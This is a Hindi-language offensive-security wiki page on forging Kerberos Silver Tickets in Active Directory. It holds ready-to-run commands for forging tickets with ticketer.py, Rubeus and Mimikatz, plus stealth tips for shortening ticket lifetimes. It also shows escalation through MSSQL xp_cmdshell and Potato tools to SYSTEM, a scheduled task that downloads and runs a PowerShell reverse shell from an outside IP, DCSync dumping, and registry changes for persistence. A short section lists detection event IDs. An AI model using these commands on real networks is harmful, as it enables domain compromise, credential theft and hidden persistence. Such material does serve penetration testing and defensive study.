# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

**Silver Ticket** attack में Active Directory (AD) environments में service tickets का exploitation शामिल होता है। यह method किसी service account, जैसे computer account, का **NTLM hash प्राप्त करने** और उससे एक Ticket Granting Service (TGS) ticket forge करने पर निर्भर करता है। इस forged ticket के साथ attacker network पर specific services को access कर सकता है और **किसी भी user का impersonation** कर सकता है, जिसका सामान्य लक्ष्य administrative privileges प्राप्त करना होता है। यह उल्लेखनीय है कि tickets forge करने के लिए AES keys का उपयोग अधिक secure और कम detectable होता है।<sup>[[1]](#references)[[2]](#references)</sup>

> [!WARNING]
> Silver Tickets, Golden Tickets की तुलना में कम detectable होते हैं क्योंकि इनके लिए krbtgt account के बजाय केवल **service account का hash** आवश्यक होता है। हालांकि, ये target की गई specific service तक सीमित होते हैं। इसके अलावा, केवल किसी user का password चुराना।
इसके अलावा, यदि आप **SPN वाले account का password compromise** कर लेते हैं, तो उस password का उपयोग करके उस service के लिए किसी भी user का impersonation करने वाला Silver Ticket बना सकते हैं।

### Modern Kerberos changes (AES-only domains)

- **8 Nov 2022 (KB5021131)** से शुरू होने वाले Windows updates, संभव होने पर service tickets को default रूप से **AES session keys** का उपयोग करने के लिए सेट करते हैं और RC4 को phase out कर रहे हैं। DCs में RC4 के **mid‑2026 तक default रूप से disabled** होने की उम्मीद है, इसलिए silver tickets के लिए NTLM/RC4 hashes पर निर्भर रहना `KRB_AP_ERR_MODIFIED` के साथ increasingly fail होता है। Target service account के लिए हमेशा **AES keys** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) extract करें।<sup>[[5]](#references)</sup>
- यदि service account का `msDS-SupportedEncryptionTypes` केवल AES तक restricted है, तो आपको `/aes256` या `-aesKey` के साथ forge करना होगा; यदि आपके पास NTLM hash हो, तब भी RC4 (`/rc4` या `-nthash`) काम नहीं करेगा।<sup>[[6]](#references)</sup>
- gMSA/computer accounts हर 30 दिनों में rotate होते हैं; forging से पहले LSASS, Secretsdump/NTDS या DCsync से **current AES key** dump करें।
- OPSEC: tools में default ticket lifetime अक्सर **10 years** होता है; abnormal lifetimes के कारण detection से बचने के लिए realistic durations (जैसे `-duration 600` minutes) सेट करें।<sup>[[6]](#references)</sup>

Ticket crafting के लिए operating system के आधार पर अलग-अलग tools का उपयोग किया जाता है:

### On Linux
```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Windows पर
```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
/domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFS service को victim के file system तक पहुंचने के लिए एक सामान्य target के रूप में highlight किया जाता है, लेकिन HOST और RPCSS जैसी अन्य services का भी tasks और WMI queries के लिए exploitation किया जा सकता है।

### Example: MSSQL service (MSSQLSvc) + Potato to SYSTEM

यदि आपके पास किसी SQL service account (जैसे, sqlsvc) का NTLM hash (या AES key) है, तो आप MSSQL SPN के लिए TGS forge कर सकते हैं और SQL service के लिए किसी भी user को impersonate कर सकते हैं। इसके बाद, SQL service account के रूप में commands execute करने के लिए xp_cmdshell enable करें। यदि उस token में SeImpersonatePrivilege है, तो SYSTEM तक elevate करने के लिए Potato को chain करें।<sup>[[4]](#references)</sup>
```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- यदि resulting context में SeImpersonatePrivilege मौजूद है (जो service accounts के लिए अक्सर true होता है), तो SYSTEM प्राप्त करने के लिए Potato variant का उपयोग करें:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
MSSQL का दुरुपयोग करने और xp_cmdshell सक्षम करने के बारे में अधिक जानकारी:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Potato techniques का overview:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Available Services

| Service Type                               | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>OS के आधार पर:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>कुछ मामलों में आप केवल यह मांग सकते हैं: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

**Rubeus** का उपयोग करके आप parameter के माध्यम से इन सभी tickets के लिए **ask for all** कर सकते हैं:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Event IDs

- 4624: Account Logon
- 4634: Account Logoff
- 4672: Admin Logon
- **उसी client/service के लिए DC पर पहले 4768/4769 का न होना** forged TGS के सीधे service को प्रस्तुत किए जाने का एक सामान्य संकेत है।
- असामान्य रूप से लंबी ticket lifetime या unexpected encryption type (जब domain AES लागू करता हो तब RC4) भी 4769/4624 data में दिखाई देते हैं।

## Persistence

मशीनों को हर 30 दिनों में अपना password बदलने से रोकने के लिए `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` सेट करें, या आप `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` को 30days से अधिक value पर सेट कर सकते हैं, ताकि वह rotation period निर्धारित हो जब machines का password rotate किया जाना चाहिए।<sup>[[3]](#references)</sup>

## Abusing Service tickets

निम्नलिखित examples में मान लेते हैं कि ticket administrator account को impersonate करके retrieve किया गया है।

### CIFS

इस ticket के साथ आप **SMB** के माध्यम से `C$` और `ADMIN$` folder तक access कर सकेंगे (यदि वे exposed हैं) और केवल इस तरह का कुछ करके remote filesystem के किसी भाग में files copy कर सकेंगे:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
आप **psexec** का उपयोग करके host के अंदर shell प्राप्त करने या arbitrary commands execute करने में भी सक्षम होंगे:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

इस permission के साथ आप remote computers में scheduled tasks बना सकते हैं और arbitrary commands execute कर सकते हैं:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

इन tickets के साथ आप **victim system में WMI execute कर सकते हैं**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
**wmiexec के बारे में अधिक जानकारी** निम्नलिखित पेज पर प्राप्त करें:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

किसी computer पर winrm access के साथ आप उसे **access कर सकते हैं** और PowerShell भी प्राप्त कर सकते हैं:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Remote host से **winrm** का उपयोग करके connect करने के **और तरीके** जानने के लिए यह पेज देखें:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> ध्यान दें कि इसे access करने के लिए remote computer पर **winrm active और listening** होना चाहिए।

### LDAP

इस privilege के साथ आप **DCSync** का उपयोग करके DC database dump कर सकते हैं:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**निम्नलिखित पेज पर DCSync के बारे में और जानें:**


{{#ref}}
dcsync.md
{{#endref}}


## संदर्भ

- [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [2] [Kerberos (II): How to attack Kerberos? - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [3] [Machine Account Password Process - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [4] [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [5] [KB5021131 Kerberos hardening & RC4 deprecation](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [6] [Impacket ticketer.py current options (AES/keytab/duration)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)

{{#include ../../banners/hacktricks-training.md}}
